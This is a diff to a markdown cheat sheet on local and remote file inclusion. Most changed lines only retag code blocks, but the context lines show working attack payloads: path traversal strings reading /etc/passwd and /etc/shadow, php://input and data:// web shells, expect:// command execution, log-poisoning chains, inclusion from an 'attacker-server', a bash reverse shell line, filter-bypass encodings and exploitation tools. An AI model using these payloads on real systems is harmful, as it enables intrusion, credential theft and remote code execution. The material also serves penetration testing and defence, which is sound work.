@@ -10,7 +10,7 @@
 
 ### Linux Systems
 
-```
+```txt
 ../../../etc/passwd
 ....//....//....//etc/passwd
 ..%2f..%2f..%2fetc%2fpasswd
@@ -20,7 +20,7 @@
 
 ### Windows Systems
 
-```
+```txt
 ..\..\..\windows\system32\drivers\etc\hosts
 ....\\....\\....\\windows\\system32\\drivers\\etc\\hosts
 ..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
@@ -30,7 +30,7 @@
 
 ### Linux Configuration Files
 
-```
+```txt
 /etc/passwd          # User accounts
 /etc/shadow          # Password hashes (requires root)
 /etc/group           # Groups
@@ -46,7 +46,7 @@
 
 ### Web Server Files
 
-```
+```txt
 /var/log/apache2/access.log
 /var/log/apache2/error.log
 /var/log/nginx/access.log
@@ -58,7 +58,7 @@
 
 ### Application Configuration
 
-```
+```txt
 /etc/mysql/my.cnf
 /etc/postgresql/postgresql.conf
 /etc/ssh/sshd_config
@@ -71,7 +71,7 @@
 
 ### php://filter (Source Code Disclosure)
 
-```
+```txt
 php://filter/read=convert.base64-encode/resource=index.php
 php://filter/convert.base64-encode/resource=config.php
 php://filter/read=string.rot13/resource=index.php
@@ -80,7 +80,7 @@ php://filter/read=convert.quoted-printable-encode/resource=index.php
 
 ### php://input (POST Data Execution)
 
-```
+```txt
 POST request to: ?file=php://input
 POST body: <?php system($_GET['cmd']); ?>
 Then: ?file=php://input&cmd=id
@@ -88,14 +88,14 @@ Then: ?file=php://input&cmd=id
 
 ### data:// (Direct Code Execution)
 
-```
+```txt
 data://text/plain,<?php system($_GET['cmd']); ?>
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
 ```
 
 ### expect:// (Command Execution)
 
-```
+```txt
 expect://id
 expect://whoami
 expect://cat /etc/passwd
@@ -112,7 +112,7 @@ expect://cat /etc/passwd
    ```
 
 2. **Access log via LFI:**
-   ```
+   ```txt
    ?file=../../../var/log/apache2/access.log&cmd=id
    ```
 
@@ -125,7 +125,7 @@ expect://cat /etc/passwd
    ```
 
 2. **Access auth log:**
-   ```
+   ```txt
    ?file=../../../var/log/auth.log&cmd=whoami
    ```
 
@@ -138,7 +138,7 @@ expect://cat /etc/passwd
    ```
 
 2. **Access mail log:**
-   ```
+   ```txt
    ?file=../../../var/log/mail.log&cmd=id
    ```
 
@@ -146,7 +146,7 @@ expect://cat /etc/passwd
 
 ### Test for RFI Support
 
-```
+```txt
 ?file=http://attacker-server/test.txt
 ?file=ftp://attacker-server/test.txt
 ?file=\\attacker-server\share\test.txt  # Windows SMB
@@ -188,28 +188,28 @@ exec("/bin/bash -i <&3 >&3 2>&3", $sock);
 
 ### Null Byte Injection (PHP < 5.3.4)
 
-```
+```txt
 ?file=../../../etc/passwd%00
 ?file=../../../etc/passwd%00.jpg
 ```
 
 ### Double Encoding
 
-```
+```txt
 %252e%252e%252f  # ../
 %252e%252e%255c  # ..\
 ```
 
 ### Unicode Bypass
 
-```
+```txt
 ..%c0%af
 ..%c1%9c
 ```
 
 ### Filter Bypass
 
-```
+```txt
 ....//
 ...\\/
 ....\\
@@ -232,7 +232,7 @@ wfuzz -u "http://target/?file=FUZZ" -w lfi-payloads.txt
 
 ### Identify OS and Services
 
-```
+```txt
 # Linux detection
 ?file=../../../etc/passwd
 ?file=../../../proc/version
@@ -293,3 +293,8 @@ if (strpos($file, '/var/www/pages/') === 0) {
 - **LFISuite** - Automated LFI exploitation
 - **fimap** - File inclusion mapper
 - **Kadimus** - LFI exploitation tool
+
+## Resources
+
+- [PayloadsAllTheThings File Inclusion](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/) — LFI/RFI payloads
+- [HackTricks File Inclusion](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html) — LFI to RCE chains
